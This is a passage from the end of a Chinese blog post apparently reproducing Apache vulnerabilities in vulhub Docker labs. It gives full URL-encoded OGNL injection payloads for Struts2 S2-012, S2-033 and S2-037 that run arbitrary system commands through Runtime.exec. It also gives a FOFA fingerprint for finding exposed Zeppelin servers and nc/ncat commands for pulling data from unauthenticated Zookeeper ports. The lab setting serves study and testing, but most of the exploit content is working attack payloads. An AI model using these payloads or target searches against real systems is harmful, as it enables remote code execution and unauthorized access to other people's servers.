+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-012
+docker-compose up -d
+</code></pre></div><p><code>URL</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp
+</code></pre><p>开启动态方法调用，使用<code>?method：execute</code>方法调用<code>execute</code>方法(<code>struts2</code>默认的<code>action</code>调用方法)，在<code>method</code>后加上要执行的<code>OGNL</code>表达式即可执行任意代码。</p>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id
+
+http://&lt;ip&gt;:&lt;port&gt;/index.action?method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&amp;cmd=id&amp;dd=%20&amp;d=____A&amp;encoding=UTF-8
+</code></pre><p>回显<code>id</code>命令结果。</p>
+<h1 id=struts2-s2-033-开启动态调试且使用rest插件时可导致远程代码执行>Struts2 S2-033 开启动态调试且使用REST插件时可导致远程代码执行<a hidden class=anchor aria-hidden=true href=#struts2-s2-033-开启动态调试且使用rest插件时可导致远程代码执行>#</a></h1>
+<h2 id=漏洞描述-32>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-32>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-033>S2-033 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>当开启动态调试并同时使用<code>Struts2 REST Plugin</code>插件时，使用<code>!</code>操作符调用动态方法可能执行<code>OGNL</code>表达式，从而导致远程代码执行。</p>
+<h2 id=影响版本-27>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-27>#</a></h2>
+<p><code>Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)</code></p>
+<h2 id=漏洞复现-28>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-28>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&amp;command=id
+</code></pre><p>回显<code>id</code>命令结果。</p>
+<h1 id=struts2-s2-034-ognl缓存中毒导致的dos漏洞>Struts2 S2-034 OGNL缓存中毒导致的DoS漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-034-ognl缓存中毒导致的dos漏洞>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-034>S2-034 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-035-易出错的行动名称清理>Struts2 S2-035 易出错的行动名称清理<a hidden class=anchor aria-hidden=true href=#struts2-s2-035-易出错的行动名称清理>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-035>S2-035 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-036-在标签属性对原始用户输入进行评估时强制双ognl评估可能导致远程代码执行漏洞类似s2-029>Struts2 S2-036 在标签属性对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行漏洞(类似S2-029)<a hidden class=anchor aria-hidden=true href=#struts2-s2-036-在标签属性对原始用户输入进行评估时强制双ognl评估可能导致远程代码执行漏洞类似s2-029>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-036>S2-036 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-037-使用rest插件时可实现远程代码执行>Struts2 S2-037 使用REST插件时可实现远程代码执行<a hidden class=anchor aria-hidden=true href=#struts2-s2-037-使用rest插件时可实现远程代码执行>#</a></h1>
+<h2 id=漏洞描述-33>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-33>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-037>S2-037 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>与<code>S2-033</code>类似，<code>S2-037</code>也是关于<code>REST</code>插件导致<code>method</code>变量被篡改造成的远程代码执行漏洞，<code>S2-037</code>也是在<code>DefaultApplicationInvocation.java</code>的<code>invokeAction</code>方法中没有对<code>methodName</code>参数进行校验，直接放到<code>getValue</code>方法中，从而造成<code>OGNL</code>表达式的注入。</p>
+<h2 id=影响版本-28>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-28>#</a></h2>
+<p><code>Struts 2.3.20 ~ 2.3.28.1(2.3.20.3、2.3.24.3除外)</code></p>
+<h2 id=漏洞复现-29>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-29>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>/orders/4/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7556&amp;command=id
+</code></pre><p>回显<code>id</code>命令执行结果。</p>
+<h1 id=struts2-s2-045-基于jakarta-multipart解析器执行文件上载时可能的远程执行代码>Struts2 S2-045 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码<a hidden class=anchor aria-hidden=true href=#struts2-s2-045-基于jakarta-multipart解析器执行文件上载时可能的远程执行代码>#</a></h1>
+<h2 id=漏洞描述-34>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-34>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-045>S2-045 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>Struts</code>使用的<code>Jakarta</code>解析文件上传请求包不当，当攻击者构造恶意<code>Content-Type</code>时，可能导致远程代码执行。</p>
+<p>在<code>default.properties</code>文件中，<code>struts.multipart.parser</code>的值有两个选择，分别是<code>jakarta</code>和<code>pell</code>(原本也有第三种选择<code>cos</code>)。其中，<code>jakarta</code>解析器是<code>Struts2</code>框架的标准组成部分，默认情况下被启动。</p>
+<h2 id=影响版本-29>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-29>#</a></h2>
+<p><code>Struts 2.3.5 ~ 2.3.31</code></p>
+<p><code>Struts 2.5 ~ 2.5.10</code></p>
+<h1 id=zeppelin-未授权任意命令执行漏洞>Zeppelin 未授权任意命令执行漏洞<a hidden class=anchor aria-hidden=true href=#zeppelin-未授权任意命令执行漏洞>#</a></h1>
+<h2 id=漏洞描述-35>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-35>#</a></h2>
+<p><code>Apache Zeppelin</code>存在未授权用户访问命令执行接口，导致容易用户可执行恶意命令获取服务器权限。</p>
+<h2 id=影响版本-30>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-30>#</a></h2>
+<p><code>Apache Zeppelin</code></p>
+<h2 id=漏洞复现-30>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-30>#</a></h2>
+<p><code>FOFA</code>：<code>icon_hash="960250052"</code></p>
+<p>含有漏洞的页面能够通过页面创建一个新的匿名用户，创建之后即可执行任意命令。</p>
+<h1 id=zookeeper-未授权访问漏洞-cve-2014-085>Zookeeper 未授权访问漏洞 CVE-2014-085<a hidden class=anchor aria-hidden=true href=#zookeeper-未授权访问漏洞-cve-2014-085>#</a></h1>
+<h2 id=漏洞描述-36>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-36>#</a></h2>
+<p>默认安装配置好的<code>Zookeeper</code>允许未授权访问，管理员未配置访问控制列表(<code>ACL</code>)，导致攻击者可以在默认开放的<code>2181</code>端口下通过执行<code>envi</code>命令获得大量敏感信息(系统名称、<code>java</code>环境)导致任意用户可以在网络不受限的情况下进行未授权访问读取数据。</p>
+<h2 id=影响版本-31>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-31>#</a></h2>
+<p><code>Apache Zookeeper</code></p>
+<h2 id=复现思路-10>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-10>#</a></h2>
+<h2 id=漏洞复现-31>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-31>#</a></h2>
+<p><code>Zookeeper</code>默认开放<code>2181</code>端口，使用如下命令获取敏感信息：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>echo envi | nc xxx.xxx.xxx.xxx <span style=color:#ae81ff>2181</span>
+
+1、stat：列出关于性能和连接的客户端的统计信息。
+echo stat | ncat &lt;ip&gt; <span style=color:#ae81ff>2181</span>
+
+2、ruok：测试服务器是否运行在非错误状态。
+echo ruok | ncat &lt;ip&gt; <span style=color:#ae81ff>2181</span>
+
+3、reqs：列出未完成的请求。
+echo reqs | ncat &lt;ip&gt; <span style=color:#ae81ff>2181</span>
+　　
+4、envi：打印有关服务环境的详细信息。
+echo envi | ncat &lt;ip&gt; <span style=color:#ae81ff>2181</span>
+　　
+5、dump：列出未完成的会话和临时节点。
+echo dump | ncat &lt;ip&gt; <span style=color:#ae81ff>2181</span>
+</code></pre></div><blockquote>
+<p>本文链接：<a href=https%EF%BC%9A//oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>Apache漏洞复现 | Atmet (oopsdc.tk)</a></p>
+<p>文章许可：本文采用<a href=https%EF%BC%9A//creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p>
+</blockquote>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://examplesite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>漏洞复现</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://examplesite.com/post/readme/>
+<span class=title>« Prev Page</span>
+<br>
+<span></span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share Apache漏洞复现 on twitter" href="https://twitter.com/intent/tweet/?text=Apache%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0&url=https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f&hashtags=%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Apache漏洞复现 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f&title=Apache%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0&summary=Apache%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0&source=https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Apache漏洞复现 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f&title=Apache%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Apache漏洞复现 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Apache漏洞复现 on whatsapp" href="https://api.whatsapp.com/send?text=Apache%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0%20-%20https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Apache漏洞复现 on telegram" href="https://telegram.me/share/url?text=Apache%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0&url=https%3a%2f%2fexamplesite.com%2fpost%2fapache%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2021 <a href=https://examplesite.com/>0opsdc</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
